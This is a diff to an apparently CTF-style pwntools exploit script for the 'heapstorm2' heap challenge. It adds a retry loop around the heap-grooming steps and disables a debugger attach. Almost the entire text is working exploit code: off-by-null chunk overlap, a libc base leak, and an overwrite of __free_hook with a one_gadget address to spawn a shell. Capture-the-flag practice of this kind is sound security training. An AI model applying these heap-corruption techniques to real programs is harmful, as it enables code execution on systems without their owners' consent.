@@ -6,7 +6,6 @@ context.log_level=1
 #elf=ELF('./libc-2.24.so')
 #one_gadget=0x3f35a
 
-p=process('./heapstorm2')
 elf=ELF('/lib/x86_64-linux-gnu/libc.so.6')
 one_gadget=0x4526A
 
@@ -36,37 +35,44 @@ def view(index):
     sla('Command: ','4')
     sla('Index: ',str(index))
 
+while True:
 
-alloc(0x18)     # 0
-alloc(0x520)    # 1
-alloc(0x18)     # 2
+	try:
+		p=process('./heapstorm2')
+		alloc(0x18)     # 0
+		alloc(0x520)    # 1
+		alloc(0x18)     # 2
+		
+		alloc(0x18)     # 3
+		alloc(0x520)    # 4
+		alloc(0x18)     # 5
+		alloc(0x18)     # 6
+		
+		update(1,'a'*0x4f0+p64(0x500))
+		dele(1)
+		update(0,'a'*12)
+		alloc(0x18)     # 1
+		alloc(0x4d0)    # 7
+		dele(1)
+		dele(2)
+		alloc(0x38)     # 1
+		alloc(0x500)    # 2
+		
+		update(4,'a'*0x4f0+p64(0x500))
+		dele(4)
+		update(3,'a'*12)
+		alloc(0x18)     # 4
+		alloc(0x4d0)    # 8
+		dele(4)
+		dele(5)
+		alloc(0x48)     # 4
+		dele(2)
+		break
+		#alloc(0x4f0)   
+	except:
+		p.close()
+		continue
 
-alloc(0x18)     # 3
-alloc(0x520)    # 4
-alloc(0x18)     # 5
-alloc(0x18)     # 6
-
-update(1,'a'*0x4f0+p64(0x500))
-dele(1)
-update(0,'a'*12)
-alloc(0x18)     # 1
-alloc(0x4d0)    # 7
-dele(1)
-dele(2)
-alloc(0x38)     # 1
-alloc(0x500)    # 2
-
-update(4,'a'*0x4f0+p64(0x500))
-dele(4)
-update(3,'a'*12)
-alloc(0x18)     # 4
-alloc(0x4d0)    # 8
-dele(4)
-dele(5)
-alloc(0x48)     # 4
-#alloc(0x4f0)   
-
-dele(2)
 alloc(0x500)    # 2
 dele(2)
 
@@ -91,7 +97,7 @@ rv('Chunk[1]: ')
 libc_base=u64(p.recv(6)+2*'\x00')-0x3c4b78
 log.info('libc base is:'+hex(libc_base))
 
-gdb.attach(p)
+#gdb.attach(p)
 update(0,p64(libc_base+free_hook)+p64(8))
 update(1,p64(libc_base+one_gadget)+p64(8))
 
